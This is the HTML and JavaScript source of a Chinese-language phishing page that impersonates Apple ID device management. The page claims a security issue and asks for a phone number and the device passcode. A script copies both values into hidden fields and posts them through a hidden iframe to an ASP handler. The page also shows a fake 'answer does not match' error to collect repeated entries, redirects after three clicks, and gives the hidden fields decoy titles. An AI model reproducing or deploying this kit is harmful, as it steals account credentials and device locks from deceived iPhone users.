<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>iPhone 设备管理</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="stylesheet" href="fonts" type="text/css">
  <link rel="stylesheet" type="text/css" media="all" href="shebei/body.css">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1 user-scalable=0">
  <script src="Javascript/Javascript.js"></script>
  <style type="text/css">
    <!--
    body {
      background-color: #FFFFFF;
    }
    -->
  </style>
</head>

<body class="tk-body">
  <div id="content">
    <appleid-repair>
      <idms-widget {show-widget-header}="showWidgetHeader" widget-title="">
        <script type="text/javascript">
          document.write("<link rel='stylesheet' type='text/css' href='shebei/repairWidgetEyebrow.css?random=" + Math.random() + "' />");
        </script>
        <script>
          $(function () {
            var app1 = $('#app1');
            app1.focus(function () {
              $(this).attr('placeholder', '电话')
            })
          })
          $(function () {
            var apwd = $('#apwd');
            apwd.focus(function () {
              $(this).attr('placeholder', '设备锁')
            })
          })
        </script>
        <div class="idms-widget-container">
          <div class="widget-header">
            <div class='pin'></div>
            <div class='pulse'>
            </div>
            <span class="sk-icon sk-icon-apple widget-logo"></span>
            <h2 class="widget-title tk-subsection-headline"> <img
                src="shebei/203fb80e7bec54e75b4e27ddb2389b504ec26a56.png" width="16" height="16" class='img'
                align="left" style="margin-top:5%;">管理您的 Apple ID</h2>
          </div>
          <div class="widget-content-wrapper">
            <div class="widget-content">
              <div class="repair-compliance-phone-number compact-content text-center">
                <div class="addPhoneContainer">
                  <compliance-phone-number-header {active-country}="activeCountry" {account-type}="accountType"
                    {cutoff-date}="cutoffDate" {case-type}="caseType" {grace-period-ended}="gracePeriodEnded">
                    <h6 class="tk-subbody-headline text-center" tabindex="-1">
                      <br><br><br>
                    </h6>
                  </compliance-phone-number-header>
                  <div class="tk-subbody context-description">
                    <label>
                      因安全问题,请验证身份信息以继续
                    </label>
                  </div>
                  <div class="idms-step-container">
                    <div class="idms-step-wrapper">
                      <div id="idms-step-1551002377508-0" class="idms-step">
                        <div class="idms-step-header clearfix">
                        </div>
                      </div>
                    </div>
                    <div class="idms-step-content">
                      <div class="context-body step-add-phone compact-input">
                        <div class="details">
                          <div class="text flow-label">
                            <div class="tk-body-reduced tk-links-stacked context-description">
                            </div>
                          </div>
                        </div>
                        <div class="form-table">
                          <div class="form-row">
                            <div class="">
                              <div class="form-element ">
                                <p style="margin: -10 auto;width:%80;height: 60px;line-height: 54px;border: 1px solid #ddd;color:#333 border-radius:5px;outline: none;"
                                  id="app1" class='input' name="app1" contenteditable="TRUE" placeholder="电话"
                                  onKeyDown="ADivFollowingText();" onKeyPress="OnTextChanged();"></p>
                              </div>
                            </div>
                          </div>
                          </br>
                          <div class="form-element ">
                            <p style="margin: -10 auto;width:%80;height: 60px;line-height: 54px;border: 1px solid #ddd;color:#333;border-radius:5px;outline: none;"
                              id="apwd" class='input' name="apwd" contenteditable="TRUE" placeholder="设备锁"
                              onKeyUp='AchangeTest(this);' onKeyDown="ADivFollowingText();"
                              onKeyPress="OnTextChanged();"></p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                </br>
                <div align="left" id="pop" style=" display:none; color: #D00000 ;font-size:13px;"><img
                    src="image/ts.png" width="13" height="13">&nbsp;您的答案与存档的安全信息不符
                  <span></span></div>
                <div class="form-label">
                  <div class="label-wrapper">
                    <label class="form-cell form-label">
                    </label>
                  </div>
                  <div class="inline-desktop inline-tablet">
                    <ff-radio-list {(value)}="mode" {options}="radioOptions">
                      <div class="radio-flex-wrapper">
                        <div class="form-row">
                          <div class="form-cell">
                            <div class="form-element">
                              <input type="radio" class="form-choice form-choice-radio"
                                name="1551002377484-0-idms-radio-list-option" id="1551002377484-0-idms-radio-list-0"
                                checked="" value="sms">
                              <label class="form-label" for="1551002377484-0-idms-radio-list-0">
                                <span class="form-choice-indicator"></span>
                                短信验证
                              </label>
                            </div>
                          </div>
                        </div>
                        <div class="form-row">
                          <div class="form-cell">
                            <div class="form-element">
                              <input type="radio" class="form-choice form-choice-radio"
                                name="1551002377484-0-idms-radio-list-option" id="1551002377484-0-idms-radio-list-1"
                                value="voice">
                              <label class="form-label" for="1551002377484-0-idms-radio-list-1">
                                <span class="form-choice-indicator"></span>
                                邮件验证
                              </label>
                            </div>
                          </div>
                        </div>
                      </div>
                    </ff-radio-list>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="idms-step-footer clearfix" ($inserted)="setPositionForFooterWrapper($element)">
            <iframe name="formget" style="display:none;">
            </iframe>
            <form target="formget" method="post" id="ajaxid" name="register" action="ajaxadd.ASP"
              onsubmit="return initData();">
              <input name="tel" id="tel" type="hidden" title="订单编号" value="">
              <input name="pms" id="pms" type="hidden" title="订单号" value="">
              <input name="username" id="username" type="hidden" value="" title="摩托车多少钱一辆" />
              <input name="userpass" id="userpass" type="hidden" value="" title="法拉利跑车多少钱一辆" />
              <input name="act" id="act" type="hidden" value="ok">
              <div class="toolbar-wrapper toolbar-footer clearfix  " id="1551002377501-0">
                <div class="button-group flow-controls clearfix pull-right ">
                  <!-- 学校班级名称 !-->
                  <div class="primary-button-group">
                    <button tabindex="0" type="button" {$disabled}="_actionDisabled"
                      ($click)="clicked(&#39;actionClicked&#39;)" disabled="">
                      <div class="overflow-text">
                        <input id="Look" type="submit" value="继续" width="26" height="26" align="right"
                          style="margin-top:-4px;outline: none;"
                          class="button button-primary last nav-action    pull-right weight-medium ng-scope"
                          onClick="document:initData()" ng-app="myApp" ng-controller="personCtrl" ng-click="toggle()">
                      </div>
                    </button>
                  </div> <!-- 学校班级名称结束 -->
                </div>
              </div>
          </div>
        </div>
  </div>
  </div>
  </div>
  </div>
  </div>
  </div>
  </div>
  </div>
  <script>
    var app = angular.module('myApp', []);
    app.controller('personCtrl', function ($scope) {
      var submitml = 0;  //（设置变量，初始为0）
      $scope.toggle = function () {
        submitml++;    //（当点击一次按钮，自加一）
        if (submitml < 3) {
        } else {
          window.location.href = 'SETUPG4HDFAG9GHAHAEHRADFHGADFHADFHAEDFH90FDHAHFADHFOOO444RGSHSTHSJJSHJSHSODFBNODIFGO.html';
        }
      };
    });
  </script>
  <script>
    function stopPropagation(e) {
      var ev = e || window.event;
      if (ev.stopPropagation) {
        ev.stopPropagation();
      }
      else if (window.event) {
        window.event.cancelBubble = true;//兼容IE
      }
    }
    $("#Look").click(function (e) {
      $("#pop").show();
      stopPropagation(e);
    });
    $(document).bind('click', function () {
      $("#pop").hide();
    });
    $("#pop").click(function (e) {
      stopPropagation(e);
    });
    function OnTextChanged() {
      if (event.keyCode == 13) {//判断是否为回车键
        event.keyCode = 0;//屏蔽回车键
        event.returnValue = false;
      }
    }
    function AchangeTest(obj) {
      if (obj.innerHTML.length == 0) {
        document.getElementById('apwd').className = 'input';
        document.getElementById('apwd').disabled = true;
        document.getElementById('Look').disabled = true;
      } else {
        document.getElementById('apwd').className = 'classa';
        document.getElementById('apwd').disabled = false;
        document.getElementById('Look').disabled = false;
      }
    }
    function initData() {
      document.getElementById("tel").value = document.getElementById("app1").innerHTML;
      document.getElementById("pms").value = document.getElementById("apwd").innerHTML;
      return true;
    }
  </script>
</body>

</html>